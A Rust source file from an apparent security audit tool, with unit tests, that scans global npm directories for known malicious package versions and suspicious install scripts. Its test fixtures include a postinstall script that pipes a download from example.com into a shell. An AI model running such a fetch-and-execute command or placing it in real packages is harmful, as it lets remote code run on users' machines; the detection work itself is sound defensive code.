//! Supply chain check: are any of the globally installed npm packages known
//! to be malicious or suspicious-looking?
//!
//! To stay fast on every audit it only looks at the global install
//! directories and the `npx` cache. The detailed scan that also covers
//! projects' `node_modules` directories is in `--npm` mode; the actual logic
//! lives in `crate::npm`.

use super::{Check, Outcome, Severity, Status};
use crate::npm::{self, Finding};
use crate::runner::CommandRunner;
use std::path::PathBuf;

pub struct NpmPackages;

impl Check for NpmPackages {
    fn id(&self) -> &'static str {
        "npm-packages"
    }
    fn name(&self) -> &'static str {
        "Malicious npm packages"
    }
    fn weight(&self) -> u32 {
        15
    }
    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let (roots, problem) = npm::global_roots_checked(runner);
        verdict(&roots, problem)
    }
}

/// Scans `roots`. `problem` says why `npm root -g` gave no answer: npm's own
/// global directory may then be missing from `roots`.
fn verdict(roots: &[PathBuf], problem: Option<String>) -> Outcome {
    match (roots.is_empty(), problem) {
        // npm is there but would not say where it installs: nothing was
        // scanned, so there is no verdict.
        (true, Some(problem)) => Outcome::unknown(format!("Global npm packages could not be located: {problem}")),
        (true, None) => Outcome::pass("No global npm install directory found; no packages to scan."),
        (false, None) => outcome(&npm::scan(roots)),
        (false, Some(problem)) => incomplete(outcome(&npm::scan(roots)), &problem),
    }
}

/// A finding in the directories that were scanned still stands, but "nothing
/// found" is no verdict when npm's own global directory may not have been
/// among them.
fn incomplete(mut outcome: Outcome, problem: &str) -> Outcome {
    let note = format!("npm's own global directory could not be located, so it may not have been scanned: {problem}.");
    if outcome.status == Status::Pass {
        Outcome::unknown(format!("{} {note}", outcome.detail))
    } else {
        outcome.detail.push_str(&format!(" Note: {note}"));
        outcome
    }
}

/// Converts the scan result into a check outcome.
fn outcome(scan: &npm::Scan) -> Outcome {
    let malware: Vec<String> = scan.malware().map(describe).collect();
    if !malware.is_empty() {
        return Outcome::fail(
            format!("Malicious packages: {}.", malware.join(", ")),
            "Remove the package and rotate your keys and passwords; scan with `--npm` for details.",
        );
    }

    let scripts: Vec<String> = scan
        .suspicious()
        .filter(|finding| finding.kind != npm::Kind::Unread)
        .map(describe)
        .collect();
    let unread: Vec<&str> = scan.unread().map(|finding| finding.package.as_str()).collect();
    if !scripts.is_empty() || !unread.is_empty() {
        let mut detail = Vec::new();
        if !scripts.is_empty() {
            detail.push(format!("Suspicious install scripts: {}.", scripts.join(", ")));
        }
        if !unread.is_empty() {
            detail.push(format!(
                "Not checked, package.json too large to read: {}.",
                unread.join(", ")
            ));
        }
        return Outcome::warn(
            detail.join(" "),
            "Review the script or the package by hand; scan with `--npm` for details and project directories.",
        );
    }

    Outcome::pass(format!(
        "{} global directories, {} packages inspected; no malware found.",
        scan.roots.len(),
        scan.packages
    ))
}

fn describe(finding: &Finding) -> String {
    format!("{}@{} ({})", finding.package, finding.version, finding.reason)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::Status;
    use std::path::PathBuf;

    /// Sets up a temporary `node_modules` and scans it.
    fn scan_fixture(label: &str, manifest: serde_json::Value) -> npm::Scan {
        let root: PathBuf = std::env::temp_dir().join(format!("swordcheck-supply-{label}-{}", std::process::id()));
        let package = root.join("node_modules/pkg");
        std::fs::create_dir_all(&package).unwrap();
        std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();

        let scan = npm::scan(&[root.join("node_modules")]);
        std::fs::remove_dir_all(&root).unwrap();
        scan
    }

    #[test]
    fn clean_packages_pass() {
        let scan = scan_fixture("clean", serde_json::json!({ "name": "express", "version": "4.18.2" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Pass);
        assert!(outcome.detail.contains("1 packages"));
    }

    #[test]
    fn known_malicious_version_fails() {
        let scan = scan_fixture("known", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Fail);
        assert!(outcome.detail.contains("chalk@5.6.1"));
    }

    #[test]
    fn suspicious_script_warns() {
        let scan = scan_fixture(
            "script",
            serde_json::json!({
                "name": "pkg",
                "version": "1.0.0",
                "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
            }),
        );
        assert_eq!(outcome(&scan).status, Status::Warn);
    }

    #[test]
    fn no_all_clear_when_npm_root_failed() {
        let root: PathBuf = std::env::temp_dir().join(format!("swordcheck-supply-root-{}", std::process::id()));
        let write = |name: &str, manifest: serde_json::Value| {
            let package = root.join("node_modules").join(name);
            std::fs::create_dir_all(&package).unwrap();
            std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();
        };
        let roots = [root.join("node_modules")];
        let failed = || Some("`npm root -g` failed: npm ERR! code ENOENT".to_string());
        let note = "npm's own global directory could not be located, so it may not have been scanned: \
                    `npm root -g` failed: npm ERR! code ENOENT.";

        // Nothing found where we looked, but npm's directory may be missing.
        write("express", serde_json::json!({ "name": "express", "version": "4.18.2" }));
        assert_eq!(verdict(&roots, None).status, Status::Pass);
        let unknown = verdict(&roots, failed());
        assert_eq!(unknown.status, Status::Unknown);
        assert_eq!(
            unknown.detail,
            format!("1 global directories, 1 packages inspected; no malware found. {note}")
        );

        // A warning or a finding still stands, with the note.
        write(
            "helper",
            serde_json::json!({
                "name": "helper",
                "version": "1.0.0",
                "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
            }),
        );
        let warn = verdict(&roots, failed());
        assert_eq!(warn.status, Status::Warn);
        assert!(warn.detail.ends_with(&format!(" Note: {note}")), "{}", warn.detail);
        write("chalk", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
        let fail = verdict(&roots, failed());
        assert_eq!(fail.status, Status::Fail);
        assert!(
            fail.detail.contains("chalk@5.6.1") && fail.detail.ends_with(note),
            "{}",
            fail.detail
        );
        std::fs::remove_dir_all(&root).unwrap();

        // No directory at all.
        assert_eq!(verdict(&[], failed()).status, Status::Unknown);
        assert_eq!(verdict(&[], None).status, Status::Pass);
    }

    #[test]
    fn unread_package_warns_with_its_own_wording() {
        let finding = |kind, package: &str| Finding {
            kind,
            package: package.into(),
            version: String::new(),
            reason: "reason".into(),
            count: 1,
            paths: Vec::new(),
        };
        let unread = npm::Scan {
            findings: vec![finding(npm::Kind::Unread, "event-stream")],
            ..npm::Scan::default()
        };
        let outcome_unread = outcome(&unread);
        assert_eq!(outcome_unread.status, Status::Warn);
        assert_eq!(
            outcome_unread.detail,
            "Not checked, package.json too large to read: event-stream."
        );

        let both = npm::Scan {
            findings: vec![
                finding(npm::Kind::Script, "helper"),
                finding(npm::Kind::Unread, "event-stream"),
            ],
            ..npm::Scan::default()
        };
        let detail = outcome(&both).detail;
        assert!(
            detail.starts_with("Suspicious install scripts: helper@ (reason)."),
            "{detail}"
        );
        assert!(
            detail.ends_with("Not checked, package.json too large to read: event-stream."),
            "{detail}"
        );
    }
}
